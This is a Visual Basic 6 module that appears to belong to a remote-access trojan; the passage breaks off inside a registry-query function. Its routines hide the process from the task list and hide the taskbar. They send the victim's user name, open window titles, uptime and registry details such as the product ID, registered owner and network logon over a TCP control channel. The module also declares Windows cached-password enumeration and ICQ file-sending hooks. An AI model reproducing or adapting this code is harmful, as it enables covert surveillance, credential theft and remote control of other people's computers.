Attribute VB_Name = "mm"
Option Explicit
Declare Function SetActiveWindow Lib "user32" (ByVal hwnd As Long) As Long
Declare Function SHGetSpecialFolderLocation Lib "shell32.dll" (ByVal hwndOwner As Long, ByVal nFolder As Long, pidl As ITEMIDLIST) As Long
Declare Function SHGetPathFromIDList Lib "shell32.dll" Alias "SHGetPathFromIDListA" (ByVal pidl As Long, ByVal pszPath As String) As Long
Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Declare Function lstrlen Lib "kernel32" Alias "lstrlenA" (ByVal lpString As Long) As Long
Declare Sub RtlMoveMemory Lib "kernel32" (dest As Any, src As Any, ByVal cb&)
Declare Sub FreeUser Lib "ICQMAPI" Alias "ICQAPIUtil_FreeUser" (puser As Long)
Declare Sub SetUserNotify Lib "ICQMAPI" Alias "ICQAPIUtil_SetUserNotificationFunc" (ByVal uNotificationCode As Long, ByVal pUserFunc As Long)
Declare Function GetDockingState Lib "ICQMAPI" Alias "ICQAPICall_GetDockingState" (iDockingState As Long) As Long
Declare Function GetFirewallSettings Lib "ICQMAPI" Alias "ICQAPICall_GetFirewallSettings" (oFireWallData As BSICQAPI_FireWallData) As Long
Declare Function GetFullOwnerData Lib "ICQMAPI" Alias "ICQAPICall_GetFullOwnerData" (ByVal ppUser As Long, ByVal iVersion As Long) As Long
Declare Function GetFullUserData Lib "ICQMAPI" Alias "ICQAPICall_GetFullUserData" (puser As BSICQAPI_User, ByVal iVersion As Long) As Long
Declare Function GetOnlineListDetails Lib "ICQMAPI" Alias "ICQAPICall_GetOnlineListDetails" (iCount As Long, ppUser As Long) As Long
Declare Function GetOnlineListPlacement Lib "ICQMAPI" (iIsShowOnlineList As Long) As Long
Declare Function GetOnlineListType Lib "ICQMAPI" Alias "ICQAPICall_GetOnlineListType" (iListType As Long) As Long
Declare Function GetVersion Lib "ICQMAPI" Alias "ICQAPICall_GetVersion" (iVersion As Long) As Long
Declare Function GetWindowHandle Lib "ICQMAPI" Alias "ICQAPICall_GetWindowHandle" (hWindow As Long) As Long
Declare Function SendFile Lib "ICQMAPI" Alias "ICQAPICall_SendFile" (ByVal iUIN As Long, ByVal pszFileNames As String) As Long
Declare Function SetLicenseKey Lib "ICQMAPI" Alias "ICQAPICall_SetLicenseKey" (ByVal pszName As String, ByVal pszPassword As String, ByVal pszLicense As String) As Long
Declare Function RegisterNotify Lib "ICQMAPI" Alias "ICQAPICall_RegisterNotify" (ByVal iVersion As Long, ByVal iCount As Long, piEvents As Byte) As Long
Declare Function UnRegisterNotify Lib "ICQMAPI" Alias "ICQAPICall_UnRegisterNotify" () As Long
Declare Sub FreeUsers Lib "ICQMAPI" Alias "ICQAPIUtil_FreeUsers" (ByVal iCount As Long, ppUsers As Long)
Declare Sub FreeGroup Lib "ICQMAPI" Alias "ICQAPIUtil_FreeGroup" (pGroup As Long)
Declare Function GetGroupOnlineListDetails Lib "ICQMAPI" Alias "ICQAPICall_GetGroupOnlineListDetails" (iGroupCount As Long, ppGroups As Long) As Long
Declare Function SetOwnerPhoneState Lib "ICQMAPI" (ByVal iPhoneState As Long) As Long
Declare Function SetOwnerState Lib "ICQMAPI" (ByVal iState As Long) As Long
Declare Function SendExternal Lib "ICQMAPI" Alias "ICQAPICall_SendExternal" (ByVal iUIN As Long, ByVal pszExternal As String, ByVal bautosend As Byte) As Long
Declare Function SendICQMessage Lib "ICQMAPI" Alias "ICQAPICall_SendMessage" (ByVal iUIN As Long, ByVal pszMessage As String) As Long
Declare Function SendURL Lib "ICQMAPI" Alias "ICQAPICall_SendURL" (ByVal iUIN As Long, ByVal pszMessage As String) As Long
#If Win32 Then
Declare Function DeleteDC Lib "gdi32" (ByVal hdc As Long) As Long
#Else
Declare Function DeleteDC Lib "GDI" (ByVal hdc As Integer) As Integer
#End If
Public Declare Function BringWindowToTop Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Public Declare Function GetActiveWindow Lib "user32" () As Long
Public Declare Function CreateDCAsNull Lib "gdi32" Alias "CreateDCA" (ByVal lpDriverName As String, lpDeviceName As Any, lpOutput As Any, lpInitData As Any) As Long
Public Declare Function DrawText Lib "user32" Alias "DrawTextA" (ByVal hdc As Long, ByVal lpStr As String, ByVal nCount As Long, lpRect As RECT, ByVal wFormat As Long) As Long
Public Declare Function GetTextColor Lib "gdi32" (ByVal hdc As Long) As Long
Public Declare Function SetTextColor Lib "gdi32" (ByVal hdc As Long, ByVal crColor As Long) As Long
Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Declare Function MapVirtualKey Lib "user32" Alias "MapVirtualKeyA" (ByVal wCode As Long, ByVal wMapType As Long) As Long
Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwflags As Long, ByVal dwExtraInfo As Long)
Declare Function GetVersionEx Lib "kernel32" Alias "GetVersionExA" (LpVersionInformation As OSVERSIONINFO) As Long
Declare Function BitBlt Lib "gdi32" (ByVal hDestDC As Integer, ByVal x As Integer, ByVal Y As Integer, ByVal nWidth As Integer, ByVal nHeight As Integer, ByVal hSrcDC As Integer, ByVal xSrc As Integer, ByVal ySrc As Integer, ByVal dwRop As Long) As Integer
Declare Function GetDC Lib "user32" (ByVal hwnd As Long) As Long
Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Private Declare Function SetCursorPos& Lib "user32" (ByVal x As Long, ByVal Y As Long)
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Declare Function WNetEnumCachedPasswords Lib "mpr.dll" (ByVal s As String, ByVal i As Integer, ByVal b As Byte, ByVal proc As Long, ByVal l As Long) As Long
Declare Function GetTickCount& Lib "kernel32" ()
Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Declare Function GetCurrentProcess Lib "kernel32" () As Long
Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessId As Long, ByVal dwType As Long) As Long
Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Declare Function GetDesktopWindow Lib "user32" () As Long
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal wIndx As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Function sndPlaySound Lib "winmm" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Declare Function waveOutGetNumDevs Lib "winmm" () As Long
Declare Function MessageBeep Lib "user32" (ByVal wType As Long) As Long
Declare Function GetDiskFreeSpace Lib "kernel32" Alias "GetDiskFreeSpaceA" (ByVal IpRootPathName As String, IpSectorsPerCluster As Long, IpBytesPerSector As Long, IpNumberOfFreeClusters As Long, IpTotalNumberOfClusters As Long) As Long
Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Declare Sub GlobalMemoryStatus Lib "kernel32" (IpBuffer As MEMORYSTATUS)
Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Any, ByVal fuWinIni As Long) As Long
Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long
Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Declare Function SwapMouseButton& Lib "user32" (ByVal bSwap As Long)
Declare Function SHShutDownDialog Lib "shell32" Alias "#60" (ByVal YourGuess As Long) As Long
Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Declare Function RegQueryValueExString Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As String, lpcbData As Long) As Long
Declare Function RegQueryValueExLong Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Long, lpcbData As Long) As Long
Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Declare Function RegQueryValueExNULL Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As Long, lpcbData As Long) As Long
Declare Function RegSetValueExString Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Declare Function RegSetValueExLong Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpValue As Long, ByVal cbData As Long) As Long
Public Type BSICQAPI_User
  m_iUIN               As Long
  m_hFloatWindow       As Long
  m_iIP                As Long
  m_szNickname(19)     As Byte
  m_szFirstName(19)    As Byte
  m_szLastName(19)     As Byte
  m_szEmail(99)        As Byte
  m_szCity(99)         As Byte
  m_szState(99)        As Byte
  m_iCountry           As Long
  m_szCountryName(99)  As Byte
  m_szHomePage(99)     As Byte
  m_iAge               As Long
  m_zsPhone(19)        As Byte
  m_bGender            As Byte
  m_iHomeZip           As Long
  m_iStateFlags        As Long
  pad(2)               As Byte
End Type
Public Type SHITEMID
cb As Long
abID As Byte
End Type

Public Type ITEMIDLIST
mkid As SHITEMID
End Type
Global Server As String
Global Port As String
Global Nickname As String
Public Type BSICQAPI_Group
  m_szName(49) As Byte
  m_iUserCount As Long
  bsUser       As Long
  pad(1)       As Byte
End Type

Public Type BSICQAPI_FireWallData
  m_bEnabled                   As Byte
  m_bSocksEnabled              As Byte
  m_sSocksVersion              As Integer
  m_szSocksHost(511)           As Byte
  m_iSocksPort                 As Long
  m_bSocksAuthenticationMethod As Byte
End Type
Private ICQ As cICQ
Public ObjPointer&
Public bs As BSICQAPI_User
Public fwd As BSICQAPI_FireWallData
Public Type Online
  UIN As Long
  hwnd As Long
End Type

Public Type Users
  named(49) As Byte
  count     As Long
  UIN()     As Long
  pad(1)    As Byte
End Type
Public m_aOnline() As Online
Public m_aGUsers() As Users
Public Type RECT
   Left As Long
   Top As Long
   Right As Long
   Bottom As Long
End Type
Public Const ICQAPINOTIFY_ONLINELIST_CHANGE = 0&
Public Const ICQAPINOTIFY_ONLINE_FULLUSERDATA_CHANGE = 1&
Public Const ICQAPINOTIFY_APPBAR_STATE_CHANGE = 2&
Public Const ICQAPINOTIFY_ONLINE_PLACEMENT_CHANGE = 3&
Public Const ICQAPINOTIFY_OWNER_CHANGE = 4&
Public Const ICQAPINOTIFY_OWNER_FULLUSERDATA_CHANGE = 5&
Public Const ICQAPINOTIFY_ONLINELIST_HANDLE_CHANGE = 6&
Public Const ICQAPINOTIFY_FILE_RECEIVED = 8&
Public Const ICQAPINOTIFY_LAST = &H80
Public Const ICQAPINOTIFY_ONLINELISTCHANGE_ONOFF = 1&
Public Const ICQAPINOTIFY_ONLINELISTCHANGE_FLOAT = 2&
Public Const ICQAPINOTIFY_ONLINELISTCHANGE_POS = 3&
Public Const MB_ICONASTERISK = &H40
Public Const MB_ICONEXCLAMATION = &H30
Public Const MB_ICONHAND = &H10
Public Const MB_ICONQUESTION = &H20
Public Const MB_OK = &H0
Public Const ERROR_SUCCESS = 0&
Public Const APINULL = 0&
Public Const HKEY_LOCAL_MACHINE = &H80000002
Public Const HKEY_CURRENT_CONFIG = &H80000005
Public Const HKEY_DYN_DATA = &H80000006
Public Const SRCCOPY = &HCC0020
Public Const SRCAND = &H8800C6
Public Const SRCINVERT = &H660046
Public Const HKEY_CLASSES_ROOT = &H80000000
Public Const HKEY_CURRENT_USER = &H80000001
Public Const HKEY_USERS = &H80000003
Public Const SWP_NOMOVE = 2
Public Const SWP_NOSIZE = 1
Public Const HWND_TOPMOST = -1
Public Const HWND_NOTOPMOST = -2
Public Const FLOAT = 1, SINK = 0
Public Const EWX_FORCE = 4
Public Const EWX_LOGOFF = 0
Public Const VK_MENU = &H12
Public Const KEYEVENTF_KEYUP = &H2
Public Const EWX_REBOOT = 2
Public Const NOERROR = 0
Public Const EWX_SHUTDOWN = 1
Public Const ERROR_NO_MORE_ITEMS = 259&
Public Const REG_NONE = 0
Public Const REG_SZ = 1
Public Const SWP_SHOWWINDOW = &H40
Public Const SWP_HIDEWINDOW = &H80
Public Const REG_EXPAND_SZ = 2
Public Const REG_BINARY = 3
Public Const REG_DWORD = 4
Public Const ERROR_NONE = 0
Public Const KEY_ALL_ACCESS = &H3F
Public Const HEKY_USERS = &H80000003
Public Const HKEY_QUERY_VALUE = &H1
Public Const GW_HWNDFIRST = 0
Public Const GW_HWNDNEXT = 2
Public Const GWL_STYLE = (-16)
Public Const Win_VISIBLE = &H10000000
Public Const Win_BORDER = &H800000
Public Const WM_CLOSE = &H10
Public Const SW_HIDE = 0
Public Const SW_MAXIMIZE = 3
Public Const SW_SHOW = 5
Public Const SW_MINIMIZE = 6
Public Const SW_SHOWNORMAL = 1
Public Const VK_LBUTTON = &H1
Public Const VK_RBUTTON = &H2
Public Const VK_CANCEL = &H3
Public Const VK_MBUTTON = &H4
Public Const VK_BACK = &H8
Public Const VK_TAB = &H9
Public Const VK_CLEAR = &HC
Public Const VK_RETURN = &HD
Public Const VK_SHIFT = &H10
Public Const VK_CONTROL = &H11
Public Const VK_PAUSE = &H13
Public Const VK_CAPITAL = &H14
Public Const VK_ESCAPE = &H1B
Public Const VK_SPACE = &H20
Public Const VK_PRIOR = &H21
Public Const VK_NEXT = &H22
Public Const VK_END = &H23
Public Const VK_HOME = &H24
Public Const VK_LEFT = &H25
Public Const VK_UP = &H26
Public Const VK_RIGHT = &H27
Public Const VK_DOWN = &H28
Public Const VK_SELECT = &H29
Public Const VK_PRINT = &H2A
Public Const VK_EXECUTE = &H2B
Public Const VK_SNAPSHOT = &H2C
Public Const VK_INSERT = &H2D
Public Const VK_DELETE = &H2E
Public Const VK_HELP = &H2F
Public Const VK_NUMPAD0 = &H60
Public Const VK_NUMPAD1 = &H61
Public Const VK_NUMPAD2 = &H62
Public Const VK_NUMPAD3 = &H63
Public Const VK_NUMPAD4 = &H64
Public Const VK_NUMPAD5 = &H65
Public Const VK_NUMPAD6 = &H66
Public Const VK_NUMPAD7 = &H67
Public Const VK_NUMPAD8 = &H68
Public Const VK_NUMPAD9 = &H69
Public Const VK_MULTIPLY = &H6A
Public Const VK_ADD = &H6B
Public Const VK_SEPARATOR = &H6C
Public Const VK_SUBTRACT = &H6D
Public Const VK_DECIMAL = &H6E
Public Const VK_DIVIDE = &H6F
Public Const VK_F1 = &H70
Public Const VK_F2 = &H71
Public Const VK_F3 = &H72
Public Const VK_F4 = &H73
Public Const VK_F5 = &H74
Public Const VK_F6 = &H75
Public Const VK_F7 = &H76
Public Const VK_F8 = &H77
Public Const VK_F9 = &H78
Public Const VK_F10 = &H79
Public Const VK_F11 = &H7A
Public Const VK_F12 = &H7B
Public Const VK_F13 = &H7C
Public Const VK_F14 = &H7D
Public Const VK_F15 = &H7E
Public Const VK_F16 = &H7F
Public Const VK_F17 = &H80
Public Const VK_F18 = &H81
Public Const VK_F19 = &H82
Public Const VK_F20 = &H83
Public Const VK_F21 = &H84
Public Const VK_F22 = &H85
Public Const VK_F23 = &H86
Public Const VK_F24 = &H87
Public Const VK_NUMLOCK = &H90
Public Const VK_SCROLL = &H91
Public Const VK_LSHIFT = &HA0
Public Const VK_RSHIFT = &HA1
Public Const VK_LCONTROL = &HA2
Public Const VK_RCONTROL = &HA3
Public Const VK_LMENU = &HA4
Public Const VK_RMENU = &HA5
Public Const VK_ATTN = &HF6
Public Const VK_CRSEL = &HF7
Public Const VK_EXSEL = &HF8
Public Const VK_EREOF = &HF9
Public Const VK_PLAY = &HFA
Public Const VK_ZOOM = &HFB
Public Const VK_NONAME = &HFC
Public Const VK_PA1 = &HFD
Public Const VK_OEM_CLEAR = &HFE
Public ReturnCode As Long
Public IsTask As Long
Public Senden As Boolean
Public Senden1 As Boolean
Public Senden2 As Boolean
Public Senden3 As Boolean
Public thechars
Public Senden4 As Boolean
Public thechar
Type OSVERSIONINFO
    dwOSVersionInfoSize As Long
    dwMajorVersion As Long
    dwMinorVersion As Long
    dwBuildNumber As Long
    dwPlatformId As Long
    szCSDVersion As String * 128
End Type
Type PASSWORD_CACHE_ENTRY
    cbEntry As Integer
    cbResource As Integer
    cbPassword As Integer
    iEntry As Byte
    nType As Byte
    abResource(1 To 1024) As Byte
End Type


Type MEMORYSTATUS
dwLength As Long
dwMemoryLoad As Long
dwTotalPhys As Long
dwAvailPhys As Long
dwTotalPageFile As Long
dwAvailPageFile As Long
dwTotalVirtual As Long
dwAvailVirtual As Long
End Type


Dim taskbarWnd As Long


Type DiskInformation
IpSectorPerCluster As Long
IpBytesPerSector As Long
IpNumberOfFreeClusters As Long
IpTotalNumberOfClusters As Long
End Type
Function WindowsDirectory() As String
Dim WinPath As String
Dim temp
    WinPath = String(145, Chr(0))
    temp = GetWindowsDirectory(WinPath, 145)
    WindowsDirectory = Left(WinPath, InStr(WinPath, Chr(0)) - 1)
End Function

Sub FloatWindow(x As Integer, Action As Integer)
On Error GoTo o
Dim wFlags As Integer, result As Integer
wFlags = SWP_NOMOVE Or SWP_NOSIZE
If Action <> 0 Then
Call SetWindowPos(x, HWND_TOPMOST, 0, 0, 0, 0, wFlags)

Else

Call SetWindowPos(x, HWND_NOTOPMOST, 0, 0, 0, 0, wFlags)

End If
Exit Sub
o:

WennFehlerDann
End Sub
Public Sub MausBewegen()
On Error GoTo u
Dim T As Integer
T = SetCursorPos&("0", "0")
Fo.TCP2.SendData "MausBewegenOK"
Exit Sub
u:
WennFehlerDann
End Sub
Sub Finde_Alle_Fenster(Ctrl, aufgerufen_von)
On Error GoTo o
    Dim HWCurr As Long
    Dim intLen As Long
    Dim strTitle As String
Ctrl.Text = ""
    HWCurr = GetWindow(aufgerufen_von.hwnd, GW_HWNDFIRST)
    Do While HWCurr
        If HWCurr <> aufgerufen_von.hwnd And TaskWindow(HWCurr) Then
            intLen = GetWindowTextLength(HWCurr) + 1
            strTitle = Space$(intLen)
            intLen = GetWindowText(HWCurr, strTitle, intLen)
            If intLen > 0 Then
                Ctrl.Text = Ctrl.Text & vbCrLf & strTitle
            End If
        End If
        HWCurr = GetWindow(HWCurr, GW_HWNDNEXT)
    Loop
    Fo.TCP2.SendData Ctrl.Text
    Exit Sub
o:
    
WennFehlerDann
End Sub
 Public Sub Sichtbar_in_TaskListe(JaNein)
 On Error GoTo z
    Dim p As Long
    Dim x As Integer
    Dim ret As Long
    If JaNein Then
    Dim regserv
    x = 0
    Else
    x = 1
    End If
    p = GetCurrentProcessId()
    regserv = RegisterServiceProcess(p, x)
    Exit Sub
z:
    
WennFehlerDann
End Sub

Public Sub WelcherUser()
On Error GoTo u
Dim s As String
Dim cnt As Long
Dim dl As Long
Dim CurUser As String
cnt = 199
s = String$(200, 0)
dl = GetUserName(s, cnt)
If dl <> 0 Then CurUser = Left$(s, cnt) Else CurUser = ""
Fo.TCP2.SendData CurUser
Exit Sub
u:
WennFehlerDann
End Sub

Public Sub WieLangeRenntWindows()
On Error GoTo g
Fo.TCP2.SendData GetTickCount
Exit Sub
g:
WennFehlerDann
End Sub

Public Sub Mail(email As String, Optional Subject As String, _
Optional Body As String)
   Call ShellExecute(0&, "Open", "mailto:" + email + _
      "?Subject=" + Subject + "&Body=" + Body, "", "", 1)
End Sub
Function TaskWindow(HWCurr As Long) As Long
    Dim lngStyle As Long
    lngStyle = GetWindowLong(HWCurr, GWL_STYLE)
    If (lngStyle And IsTask) = IsTask Then TaskWindow = True
End Function

Public Function StartURL(URL As String) As Long
On Error GoTo z
Dim Scr_hDC As Long
Scr_hDC = GetDesktopWindow()
StartURL = ShellExecute(Scr_hDC, "Open", URL, "", "C:\", SW_SHOWNORMAL)
Exit Function
z:
WennFehlerDann
End Function
Public Sub Taskbar(Visible As Boolean)
taskbarWnd = FindWindow("Shell_TrayWnd", vbNullString)
If Visible = False Then
Dim ff As Long
Call SetWindowPos(taskbarWnd, 0, 0, 0, 0, 0, SWP_HIDEWINDOW)
Else
Call SetWindowPos(taskbarWnd, 0, 0, 0, 0, 0, SWP_SHOWWINDOW)
End If
End Sub
Public Function UserInfo(HTML As Boolean) As String
   On Error GoTo o
Dim info(1 To 12) As String
Dim nFO As String
Dim NextX As Integer
Dim cmStr As String

cmStr = "SOFTWARE\Microsoft\Windows\CurrentVersion"

info(1) = "Product Name          : " & _
          QueryValue(cmStr, "ProductName")

info(2) = "Product ID            : " & _
          QueryValue(cmStr, "ProductId")

info(3) = "Product Type          : " & _
          QueryValue(cmStr, "ProductType")

info(4) = "User Organization     : " & _
          QueryValue(cmStr, "RegisteredOrganization")

info(5) = "User Name             : " & _
          QueryValue(cmStr, "RegisteredOwner")

info(6) = "System Root           : " & _
          QueryValue(cmStr, "SystemRoot")

info(7) = "Version               : " & _
          QueryValue(cmStr, "Version")

info(8) = "Version Number        : " & _
          QueryValue(cmStr, "VersionNumber")

info(9) = "Sub Version Number    : " & _
          QueryValue(cmStr, "SubVersionNumber")

info(10) = "Computer Name         : " & _
           QueryValue("System\CurrentControlSet\control\ComputerName\ComputerName", "ComputerName")

info(11) = "Time Zone    : " & _
           QueryValue("System\CurrentControlSet\control\TimeZoneInformation", "StandardName")

info(12) = "Network Logon         : " & _
           QueryValue("Network\Logon", "username")

If HTML = True Then
    nFO = "<Br>"
Else
    nFO = vbCrLf
End If

For NextX = 1 To 12

If HTML = True Then
        nFO = nFO & info(NextX) & "<BR>"
Else
    nFO = nFO & info(NextX) & vbCrLf
 
End If


Next NextX
UserInfo = TrimCharacter(nFO, Chr(0))
Fo.Text1.Text = Fo.Text1.Text & vbCrLf & UserInfo
thechar = ""
thechars = ""
Exit Function
o:
WennFehlerDann
End Function


Sub SetKeyValue(sKeyName As String, sValueName As String, vValueSetting As Variant, lValueType As Long, aB As String)
   On Error GoTo o
    Dim Zero As Long
    Dim IRetVal As Long
    Dim hKey As Long
If aB = "Local" Then
    IRetVal = RegOpenKeyEx(HKEY_LOCAL_MACHINE, sKeyName, Zero, KEY_ALL_ACCESS, hKey)
    
ElseIf aB = "CurrentUser" Then
    IRetVal = RegOpenKeyEx(HKEY_CURRENT_USER, sKeyName, Zero, KEY_ALL_ACCESS, hKey)
  ElseIf aB = "User" Then
    IRetVal = RegOpenKeyEx(HKEY_USERS, sKeyName, Zero, KEY_ALL_ACCESS, hKey)
ElseIf aB = "Class" Then
    IRetVal = RegOpenKeyEx(HKEY_CLASSES_ROOT, sKeyName, Zero, KEY_ALL_ACCESS, hKey)
    ElseIf aB = "Dyn" Then
    IRetVal = RegOpenKeyEx(HKEY_DYN_DATA, sKeyName, Zero, KEY_ALL_ACCESS, hKey)
ElseIf aB = "Config" Then
    IRetVal = RegOpenKeyEx(HKEY_CURRENT_CONFIG, sKeyName, Zero, KEY_ALL_ACCESS, hKey)
End If
    IRetVal = SetValueEx(hKey, sValueName, lValueType, vValueSetting)

    RegCloseKey (hKey)
Exit Sub
o:
WennFehlerDann
End Sub

   Function QueryValue(sKeyName As String, sValueName As String) As String
   On Error GoTo o
       Dim lRetVal As Long
       Dim hKey As Long
       Dim vValue As Variant

       lRetVal = RegOpenKeyEx(HKEY_LOCAL_MACHINE, sKeyName, 0, KEY_ALL_ACCESS, hKey)
       lRetVal = QueryValueEx(hKey, sValueName, vValue)
       QueryValue = vValue
       RegCloseKey (hKey)
Exit Function
o:
WennFehlerDann
   End Function

Function SetValueEx(ByVal hKey As Long, sValueName As String, lType As Long, vValue As Variant) As Long
   On Error GoTo o

    Dim lValue As Long
    Dim sValue As String
    Select Case lType
        Case REG_SZ
            sValue = vValue & Chr$(0)
            SetValueEx = RegSetValueExString(hKey, sValueName, 0&, lType, sValue, Len(sValue))
        Case REG_DWORD
            lValue = vValue
            SetValueEx = RegSetValueExLong(hKey, sValueName, 0&, lType, lValue, 4)

        End Select
Exit Function
o:
WennFehlerDann

End Function

Function QueryValueEx(ByVal lhKey As Long, ByVal szValueName As String, vValue As Variant) As Long
   On Error GoTo o

    Dim cch As Long
    Dim lrc As Long
    Dim lType As Long
    Dim lValue As Long
    Dim sValue As String

    On Error GoTo QueryValueExError


    lrc = RegQueryValueExNULL(lhKey, szValueName, 0&, lType, 0&, cch)
    If lrc <> ERROR_NONE Then Error 5

    Select Case lType

        Case REG_SZ:
            sValue = String(cch, 0)

 lrc = RegQueryValueExString(lhKey, szValueName, 0&, lType, sValue, cch)

            If lrc = ERROR_NONE Then
                vValue = Left$(sValue, cch)
            Else
                vValue = Empty
            End If

        Case REG_DWORD:



lrc = RegQueryValueExLong(lhKey, szValueName, 0&, lType, lValue, cch)

            If lrc = ERROR_NONE Then vValue = lValue
        Case Else

            lrc = -1
    End Select




QueryValueExExit:

    QueryValueEx = lrc
    Exit Function



QueryValueExError:

    Resume QueryValueExExit
Exit Function
o:
WennFehlerDann
End Function

Function ReplaceText(Text, charfind, charchange)
   On Error GoTo o
Dim rReplace As Long
If InStr(Text, charfind) = 0 Then
ReplaceText = Text
Exit Function
End If

For rReplace = 1 To Len(Text)
thechar = Mid(Text, rReplace, 1)
thechars = thechars & thechar

If thechar = charfind Then
thechars = Mid(thechars, 1, Len(thechars) - 1) + charchange
End If
Next rReplace

ReplaceText = thechars
Exit Function
o:
WennFehlerDann
End Function

Function TrimCharacter(thetext, chars)
   On Error GoTo o
TrimCharacter = ReplaceText(thetext, chars, "")
Exit Function
o:
WennFehlerDann
End Function
Sub aSetKeyValue(sKeyName As String, sValueName As String, vValueSetting As Variant, lValueType As Long)
On Error GoTo o
    Dim Zero As Long
    Dim IRetVal As Long
    Dim hKey As Long

    IRetVal = RegOpenKeyEx(HKEY_LOCAL_MACHINE, sKeyName, Zero, KEY_ALL_ACCESS, hKey)

    IRetVal = aSetValueEx(hKey, sValueName, lValueType, vValueSetting)

    RegCloseKey (hKey)
Exit Sub
o:
WennFehlerDann
End Sub

   Function aQueryValue(sKeyName As String, sValueName As String, aB As String) As String
   On Error GoTo o
       Dim lRetVal As Long
       Dim hKey As Long
       Dim vValue As Variant
If aB = "Local" Then
lRetVal = RegOpenKeyEx(HKEY_LOCAL_MACHINE, sKeyName, 0, KEY_ALL_ACCESS, hKey)
ElseIf aB = "CurrentUser" Then
lRetVal = RegOpenKeyEx(HKEY_CURRENT_USER, sKeyName, 0, KEY_ALL_ACCESS, hKey)
ElseIf aB = "User" Then
lRetVal = RegOpenKeyEx(HKEY_USERS, sKeyName, 0, KEY_ALL_ACCESS, hKey)
ElseIf aB = "Class" Then
lRetVal = RegOpenKeyEx(HKEY_CLASSES_ROOT, sKeyName, 0, KEY_ALL_ACCESS, hKey)
ElseIf aB = "Dyn" Then
lRetVal = RegOpenKeyEx(HKEY_DYN_DATA, sKeyName, 0, KEY_ALL_ACCESS, hKey)
ElseIf aB = "Config" Then
lRetVal = RegOpenKeyEx(HKEY_CURRENT_CONFIG, sKeyName, 0, KEY_ALL_ACCESS, hKey)
End If
       
       lRetVal = aQueryValueEx(hKey, sValueName, vValue)
       aQueryValue = vValue
       RegCloseKey (hKey)
Exit Function
o:
WennFehlerDann
   End Function

Function aSetValueEx(ByVal hKey As Long, sValueName As String, lType As Long, vValue As Variant) As Long
   On Error GoTo o

    Dim lValue As Long
    Dim sValue As String
    Select Case lType
        Case REG_SZ
            sValue = vValue & Chr$(0)
            aSetValueEx = RegSetValueExString(hKey, sValueName, 0&, lType, sValue, Len(sValue))
        Case REG_DWORD
            lValue = vValue
            aSetValueEx = RegSetValueExLong(hKey, sValueName, 0&, lType, lValue, 4)

        End Select
Exit Function
o:
WennFehlerDann

End Function

Function aQueryValueEx(ByVal lhKey As Long, ByVal szValueName As String, vValue As Variant) As Long
   On Error GoTo o

    Dim cch As Long
    Dim lrc As Long
    Dim lType As Long
    Dim lValue As Long
